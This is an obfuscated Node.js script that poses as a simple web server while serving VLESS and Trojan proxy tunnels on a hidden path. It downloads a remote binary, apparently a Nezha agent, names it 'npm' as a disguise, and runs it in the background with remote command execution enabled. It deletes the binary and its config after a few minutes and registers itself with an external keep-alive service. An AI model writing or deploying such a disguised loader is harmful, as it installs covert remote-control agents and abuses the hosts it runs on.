function _0x59e7(_0x1115b5,_0x21eb42){_0x1115b5=_0x1115b5-0x139;const _0x5bc342=_0x5bc3();let _0x59e73c=_0x5bc342[_0x1115b5];return _0x59e73c;}const _0x27a03c=_0x59e7;(function(_0x74bec0,_0x2a2ae1){const _0x468364=_0x59e7,_0x251b0a=_0x74bec0();while(!![]){try{const _0x5e6138=-parseInt(_0x468364(0x14f))/0x1+parseInt(_0x468364(0x18e))/0x2+parseInt(_0x468364(0x160))/0x3*(parseInt(_0x468364(0x14a))/0x4)+-parseInt(_0x468364(0x161))/0x5+-parseInt(_0x468364(0x1b4))/0x6*(-parseInt(_0x468364(0x1a3))/0x7)+-parseInt(_0x468364(0x13d))/0x8*(-parseInt(_0x468364(0x193))/0x9)+-parseInt(_0x468364(0x1a1))/0xa;if(_0x5e6138===_0x2a2ae1)break;else _0x251b0a['push'](_0x251b0a['shift']());}catch(_0x2766fd){_0x251b0a['push'](_0x251b0a['shift']());}}}(_0x5bc3,0x7fbac));function _0x5bc3(){const _0x54ee3e=['8.8.4.4','net','--tls','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','length','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','createHash','toString','replace','index.html','buffer','url','chmod\x20+x\x20npm','concat','358250dCkFbo','SUB_PATH','close','application/dns-json','text/html','16578Ljxhlf','/bin/bash','writeHead','aarch64','post','2096','@cdns.doon.eu.org:443?security=tls&sni=','NEZHA_SERVER','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','application/json','pipe','utf-8','Automatic\x20Access\x20Task\x20added\x20successfully','error','7317030qJCdAb','NAME','28147FKLZQf','NEZHA_PORT','https://amd64.ssss.nyc.mn/v1','data','readFile','type','sub','reduce','&path=%2F','AUTO_ACCESS','client_secret:\x20','substr','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','createWriteStream','&fp=chrome&type=ws&host=','get','https://api.ip.sb/geoip','306DMxiyy','write','connect','Server\x20is\x20running\x20on\x20port\x20','env','catch','message','4536lVukDR','443','pop','includes','https://amd64.ssss.nyc.mn/agent','2087','https://','https://arm64.ssss.nyc.mn/v1','Failed\x20to\x20resolve\x20','\x20with\x20all\x20DNS\x20servers','npm\x20is\x20already\x20running,\x20skip\x20running...','utf8','readUInt16BE','4xJJQwD','country_code','Answer','2053','from','302988EhggFR','crypto','Unknown','2083','slice','axios','http','npm','39c37d00-61d6-4b60-9ca2-fa3c1189f8d1','&type=A','Hello\x20world!','Not\x20Found\x0a','decode','find','true','npm\x20is\x20running','send','2058351Upvmpb','2784280YWtOfW','8443','base64','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','false','writeFileSync','finish','hex','then','Status','every','digest','arm64','config.yaml','end','unlink','update','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','https://dns.google/resolve?name=','readUInt8','trim','https://oooo.serv00.net/add-url','sha224','NEZHA_KEY','join','path','arm','UUID','log','arch','map'];_0x5bc3=function(){return _0x54ee3e;};return _0x5bc3();}const os=require('os'),http=require(_0x27a03c(0x155)),fs=require('fs'),axios=require(_0x27a03c(0x154)),net=require(_0x27a03c(0x181)),path=require(_0x27a03c(0x17a)),crypto=require(_0x27a03c(0x150)),{Buffer}=require(_0x27a03c(0x18a)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x27a03c(0x17c)]||_0x27a03c(0x157),NEZHA_SERVER=process[_0x27a03c(0x13a)][_0x27a03c(0x19a)]||'',NEZHA_PORT=process[_0x27a03c(0x13a)][_0x27a03c(0x1a4)]||'',NEZHA_KEY=process[_0x27a03c(0x13a)][_0x27a03c(0x178)]||'',DOMAIN=process[_0x27a03c(0x13a)]['DOMAIN']||'1234.abc.com',AUTO_ACCESS=process['env'][_0x27a03c(0x1ac)]||![],WSPATH=process[_0x27a03c(0x13a)]['WSPATH']||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x27a03c(0x13a)][_0x27a03c(0x18f)]||_0x27a03c(0x1a9),NAME=process[_0x27a03c(0x13a)][_0x27a03c(0x1a2)]||'',PORT=process[_0x27a03c(0x13a)]['PORT']||0xbb8;let ISP='';const GetISP=async()=>{const _0x5b2437=_0x27a03c;try{const _0x11b0ac=await axios['get'](_0x5b2437(0x1b3)),_0x67f351=_0x11b0ac['data'];ISP=(_0x67f351[_0x5b2437(0x14b)]+'-'+_0x67f351['isp'])[_0x5b2437(0x188)](/ /g,'_');}catch(_0x1dc885){ISP=_0x5b2437(0x151);}};GetISP();const httpServer=http['createServer']((_0x4406e2,_0x354403)=>{const _0x5e9c8c=_0x27a03c;if(_0x4406e2[_0x5e9c8c(0x18b)]==='/'){const _0x223ff5=path[_0x5e9c8c(0x179)](__dirname,_0x5e9c8c(0x189));fs[_0x5e9c8c(0x1a7)](_0x223ff5,_0x5e9c8c(0x148),(_0x375c47,_0x40b920)=>{const _0x5cf1bc=_0x5e9c8c;if(_0x375c47){_0x354403[_0x5cf1bc(0x195)](0xc8,{'Content-Type':_0x5cf1bc(0x192)}),_0x354403[_0x5cf1bc(0x16f)](_0x5cf1bc(0x159));return;}_0x354403[_0x5cf1bc(0x195)](0xc8,{'Content-Type':_0x5cf1bc(0x192)}),_0x354403[_0x5cf1bc(0x16f)](_0x40b920);});return;}else{if(_0x4406e2[_0x5e9c8c(0x18b)]==='/'+SUB_PATH){const _0xe9cac6=NAME?NAME+'-'+ISP:ISP,_0x5d61a3='vless://'+UUID+_0x5e9c8c(0x164)+DOMAIN+_0x5e9c8c(0x1b1)+DOMAIN+_0x5e9c8c(0x1ab)+WSPATH+'#'+_0xe9cac6,_0x25a627='trojan://'+UUID+_0x5e9c8c(0x199)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+_0xe9cac6,_0x143ec3=_0x5d61a3+'\x0a'+_0x25a627,_0x3cf417=Buffer[_0x5e9c8c(0x14e)](_0x143ec3)['toString'](_0x5e9c8c(0x163));_0x354403[_0x5e9c8c(0x195)](0xc8,{'Content-Type':'text/plain'}),_0x354403['end'](_0x3cf417+'\x0a');}else _0x354403[_0x5e9c8c(0x195)](0x194,{'Content-Type':'text/plain'}),_0x354403[_0x5e9c8c(0x16f)](_0x5e9c8c(0x15a));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x27a03c(0x180),'1.1.1.1'];function resolveHost(_0x472d8e){return new Promise((_0x64861a,_0x597d41)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x472d8e)){_0x64861a(_0x472d8e);return;}let _0x281c81=0x0;function _0x5f2820(){const _0x5647cc=_0x59e7;if(_0x281c81>=DNS_SERVERS[_0x5647cc(0x184)]){_0x597d41(new Error(_0x5647cc(0x145)+_0x472d8e+_0x5647cc(0x146)));return;}const _0x46df82=DNS_SERVERS[_0x281c81];_0x281c81++;const _0x25c8db=_0x5647cc(0x173)+encodeURIComponent(_0x472d8e)+_0x5647cc(0x158);axios[_0x5647cc(0x1b2)](_0x25c8db,{'timeout':0x1388,'headers':{'Accept':_0x5647cc(0x191)}})[_0x5647cc(0x169)](_0x25b1e9=>{const _0xa2e79a=_0x5647cc,_0x4ead76=_0x25b1e9[_0xa2e79a(0x1a6)];if(_0x4ead76[_0xa2e79a(0x16a)]===0x0&&_0x4ead76[_0xa2e79a(0x14c)]&&_0x4ead76[_0xa2e79a(0x14c)]['length']>0x0){const _0x52dbbe=_0x4ead76[_0xa2e79a(0x14c)][_0xa2e79a(0x15c)](_0x454203=>_0x454203[_0xa2e79a(0x1a8)]===0x1);if(_0x52dbbe){_0x64861a(_0x52dbbe['data']);return;}}_0x5f2820();})[_0x5647cc(0x13b)](_0x303a42=>{_0x5f2820();});}_0x5f2820();});}function handleVlessConnection(_0x45cc52,_0x2cf2ef){const _0x19110f=_0x27a03c,[_0x4a5b3f]=_0x2cf2ef,_0x3becd6=_0x2cf2ef['slice'](0x1,0x11);if(!_0x3becd6[_0x19110f(0x16b)]((_0x4d077b,_0x20eaec)=>_0x4d077b==parseInt(uuid['substr'](_0x20eaec*0x2,0x2),0x10)))return![];let _0x26d1eb=_0x2cf2ef[_0x19110f(0x153)](0x11,0x12)['readUInt8']()+0x13;const _0x406ae0=_0x2cf2ef[_0x19110f(0x153)](_0x26d1eb,_0x26d1eb+=0x2)[_0x19110f(0x149)](0x0),_0x1c16c7=_0x2cf2ef[_0x19110f(0x153)](_0x26d1eb,_0x26d1eb+=0x1)[_0x19110f(0x174)](),_0x220f23=_0x1c16c7==0x1?_0x2cf2ef['slice'](_0x26d1eb,_0x26d1eb+=0x4)[_0x19110f(0x179)]('.'):_0x1c16c7==0x2?new TextDecoder()[_0x19110f(0x15b)](_0x2cf2ef['slice'](_0x26d1eb+0x1,_0x26d1eb+=0x1+_0x2cf2ef[_0x19110f(0x153)](_0x26d1eb,_0x26d1eb+0x1)[_0x19110f(0x174)]())):_0x1c16c7==0x3?_0x2cf2ef['slice'](_0x26d1eb,_0x26d1eb+=0x10)[_0x19110f(0x1aa)]((_0x44d84b,_0x2c6b07,_0x38ef8f,_0x1f4349)=>_0x38ef8f%0x2?_0x44d84b[_0x19110f(0x18d)](_0x1f4349[_0x19110f(0x153)](_0x38ef8f-0x1,_0x38ef8f+0x1)):_0x44d84b,[])[_0x19110f(0x17f)](_0x56a556=>_0x56a556[_0x19110f(0x149)](0x0)['toString'](0x10))['join'](':'):'';_0x45cc52[_0x19110f(0x15f)](new Uint8Array([_0x4a5b3f,0x0]));const _0x57843c=createWebSocketStream(_0x45cc52);return resolveHost(_0x220f23)[_0x19110f(0x169)](_0x2826ca=>{const _0x28b730=_0x19110f;net['connect']({'host':_0x2826ca,'port':_0x406ae0},function(){const _0x1ce607=_0x59e7;this[_0x1ce607(0x1b5)](_0x2cf2ef[_0x1ce607(0x153)](_0x26d1eb)),_0x57843c['on'](_0x1ce607(0x1a0),()=>{})[_0x1ce607(0x19d)](this)['on'](_0x1ce607(0x1a0),()=>{})[_0x1ce607(0x19d)](_0x57843c);})['on'](_0x28b730(0x1a0),()=>{});})[_0x19110f(0x13b)](_0x1f7778=>{const _0x464132=_0x19110f;net['connect']({'host':_0x220f23,'port':_0x406ae0},function(){const _0x22be81=_0x59e7;this[_0x22be81(0x1b5)](_0x2cf2ef[_0x22be81(0x153)](_0x26d1eb)),_0x57843c['on'](_0x22be81(0x1a0),()=>{})[_0x22be81(0x19d)](this)['on']('error',()=>{})[_0x22be81(0x19d)](_0x57843c);})['on'](_0x464132(0x1a0),()=>{});}),!![];}function handleTrojanConnection(_0x22af7a,_0x5bf675){const _0x3546bf=_0x27a03c;try{if(_0x5bf675[_0x3546bf(0x184)]<0x3a)return![];const _0x29638e=_0x5bf675[_0x3546bf(0x153)](0x0,0x38)['toString'](),_0x4cf48f=[UUID];let _0xcfae81=null;for(const _0x9a5f72 of _0x4cf48f){const _0x54a4e0=crypto[_0x3546bf(0x186)](_0x3546bf(0x177))[_0x3546bf(0x171)](_0x9a5f72)[_0x3546bf(0x16c)](_0x3546bf(0x168));if(_0x54a4e0===_0x29638e){_0xcfae81=_0x9a5f72;break;}}if(!_0xcfae81)return![];let _0x397003=0x38;_0x5bf675[_0x397003]===0xd&&_0x5bf675[_0x397003+0x1]===0xa&&(_0x397003+=0x2);const _0x38922c=_0x5bf675[_0x397003];if(_0x38922c!==0x1)return![];_0x397003+=0x1;const _0xde3e20=_0x5bf675[_0x397003];_0x397003+=0x1;let _0x10807b,_0x2b2f41;if(_0xde3e20===0x1)_0x10807b=_0x5bf675['slice'](_0x397003,_0x397003+0x4)['join']('.'),_0x397003+=0x4;else{if(_0xde3e20===0x3){const _0x4275b2=_0x5bf675[_0x397003];_0x397003+=0x1,_0x10807b=_0x5bf675[_0x3546bf(0x153)](_0x397003,_0x397003+_0x4275b2)['toString'](),_0x397003+=_0x4275b2;}else{if(_0xde3e20===0x4)_0x10807b=_0x5bf675[_0x3546bf(0x153)](_0x397003,_0x397003+0x10)[_0x3546bf(0x1aa)]((_0x1aa182,_0x208bd6,_0x4bd27b,_0x47d2fc)=>_0x4bd27b%0x2?_0x1aa182[_0x3546bf(0x18d)](_0x47d2fc[_0x3546bf(0x153)](_0x4bd27b-0x1,_0x4bd27b+0x1)):_0x1aa182,[])[_0x3546bf(0x17f)](_0x1a9946=>_0x1a9946[_0x3546bf(0x149)](0x0)[_0x3546bf(0x187)](0x10))[_0x3546bf(0x179)](':'),_0x397003+=0x10;else return![];}}_0x2b2f41=_0x5bf675[_0x3546bf(0x149)](_0x397003),_0x397003+=0x2;_0x397003<_0x5bf675[_0x3546bf(0x184)]&&_0x5bf675[_0x397003]===0xd&&_0x5bf675[_0x397003+0x1]===0xa&&(_0x397003+=0x2);const _0x33c3e1=createWebSocketStream(_0x22af7a);return resolveHost(_0x10807b)[_0x3546bf(0x169)](_0xc2be73=>{net['connect']({'host':_0xc2be73,'port':_0x2b2f41},function(){const _0xd6bf94=_0x59e7;_0x397003<_0x5bf675[_0xd6bf94(0x184)]&&this[_0xd6bf94(0x1b5)](_0x5bf675['slice'](_0x397003)),_0x33c3e1['on'](_0xd6bf94(0x1a0),()=>{})[_0xd6bf94(0x19d)](this)['on'](_0xd6bf94(0x1a0),()=>{})[_0xd6bf94(0x19d)](_0x33c3e1);})['on']('error',()=>{});})['catch'](_0x190aea=>{const _0x5f263c=_0x3546bf;net[_0x5f263c(0x1b6)]({'host':_0x10807b,'port':_0x2b2f41},function(){const _0x2a3eed=_0x5f263c;_0x397003<_0x5bf675['length']&&this[_0x2a3eed(0x1b5)](_0x5bf675[_0x2a3eed(0x153)](_0x397003)),_0x33c3e1['on'](_0x2a3eed(0x1a0),()=>{})[_0x2a3eed(0x19d)](this)['on'](_0x2a3eed(0x1a0),()=>{})['pipe'](_0x33c3e1);})['on'](_0x5f263c(0x1a0),()=>{});}),!![];}catch(_0xb0b249){return![];}}wss['on']('connection',(_0x453257,_0xe187ab)=>{const _0x587482=_0x27a03c,_0x423fcc=_0xe187ab[_0x587482(0x18b)]||'';_0x453257['once'](_0x587482(0x13c),_0x4286aa=>{const _0x38ad98=_0x587482;if(_0x4286aa[_0x38ad98(0x184)]>0x11&&_0x4286aa[0x0]===0x0){const _0x5a3b05=_0x4286aa[_0x38ad98(0x153)](0x1,0x11),_0x975ed5=_0x5a3b05[_0x38ad98(0x16b)]((_0x2ec7f9,_0x2b443c)=>_0x2ec7f9==parseInt(uuid[_0x38ad98(0x1ae)](_0x2b443c*0x2,0x2),0x10));if(_0x975ed5){!handleVlessConnection(_0x453257,_0x4286aa)&&_0x453257[_0x38ad98(0x190)]();return;}}!handleTrojanConnection(_0x453257,_0x4286aa)&&_0x453257['close']();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x1b850a=_0x27a03c,_0x355cff=os[_0x1b850a(0x17e)]();return _0x355cff===_0x1b850a(0x17b)||_0x355cff===_0x1b850a(0x16d)||_0x355cff===_0x1b850a(0x196)?!NEZHA_PORT?_0x1b850a(0x144):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x1b850a(0x1a5):_0x1b850a(0x141);},downloadFile=async()=>{const _0x240319=_0x27a03c;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x20e2e8=getDownloadUrl(),_0x4d02fc=await axios({'method':_0x240319(0x1b2),'url':_0x20e2e8,'responseType':'stream'}),_0x5bd718=fs[_0x240319(0x1b0)](_0x240319(0x156));return _0x4d02fc[_0x240319(0x1a6)][_0x240319(0x19d)](_0x5bd718),new Promise((_0x1466e4,_0x15c15e)=>{const _0x1e7e89=_0x240319;_0x5bd718['on'](_0x1e7e89(0x167),()=>{const _0xc81023=_0x1e7e89;console[_0xc81023(0x17d)]('npm\x20download\x20successfully'),exec(_0xc81023(0x18c),_0x2bdfd3=>{if(_0x2bdfd3)_0x15c15e(_0x2bdfd3);_0x1466e4();});}),_0x5bd718['on']('error',_0x15c15e);});}catch(_0x50ffd6){throw _0x50ffd6;}},runnz=async()=>{const _0x3b7d98=_0x27a03c;try{const _0x463d77=execSync(_0x3b7d98(0x1af),{'encoding':_0x3b7d98(0x19e)});if(_0x463d77[_0x3b7d98(0x175)]()!==''){console[_0x3b7d98(0x17d)](_0x3b7d98(0x147));return;}}catch(_0x2cf0cf){}await downloadFile();let _0x339485='',_0x284dde=[_0x3b7d98(0x13e),_0x3b7d98(0x162),_0x3b7d98(0x198),_0x3b7d98(0x142),_0x3b7d98(0x152),_0x3b7d98(0x14d)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x362c14=_0x284dde[_0x3b7d98(0x140)](NEZHA_PORT)?_0x3b7d98(0x182):'';_0x339485='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x362c14+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x26c53c=NEZHA_SERVER[_0x3b7d98(0x140)](':')?NEZHA_SERVER['split'](':')[_0x3b7d98(0x13f)]():'',_0x5cf6f1=_0x284dde[_0x3b7d98(0x140)](_0x26c53c)?_0x3b7d98(0x15d):_0x3b7d98(0x165),_0x17663d=_0x3b7d98(0x1ad)+NEZHA_KEY+_0x3b7d98(0x185)+NEZHA_SERVER+_0x3b7d98(0x183)+_0x5cf6f1+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x3b7d98(0x166)](_0x3b7d98(0x16e),_0x17663d);}_0x339485=_0x3b7d98(0x172);}else{console[_0x3b7d98(0x17d)](_0x3b7d98(0x19b));return;}}try{exec(_0x339485,{'shell':_0x3b7d98(0x194)},_0x953c02=>{const _0xe70791=_0x3b7d98;if(_0x953c02)console[_0xe70791(0x1a0)]('npm\x20running\x20error:',_0x953c02);else console[_0xe70791(0x17d)](_0xe70791(0x15e));});}catch(_0x2820fe){console[_0x3b7d98(0x1a0)]('error:\x20'+_0x2820fe);}};async function addAccessTask(){const _0x509870=_0x27a03c;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x523462=_0x509870(0x143)+DOMAIN+'/'+SUB_PATH;try{const _0x1fa555=await axios[_0x509870(0x197)](_0x509870(0x176),{'url':_0x523462},{'headers':{'Content-Type':_0x509870(0x19c)}});console[_0x509870(0x17d)](_0x509870(0x19f));}catch(_0x3f23a0){}}const delFiles=()=>{const _0x477f03=_0x27a03c;fs[_0x477f03(0x170)](_0x477f03(0x156),()=>{}),fs[_0x477f03(0x170)]('config.yaml',()=>{});};httpServer['listen'](PORT,()=>{const _0x3b5945=_0x27a03c;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x3b5945(0x139)+PORT);});
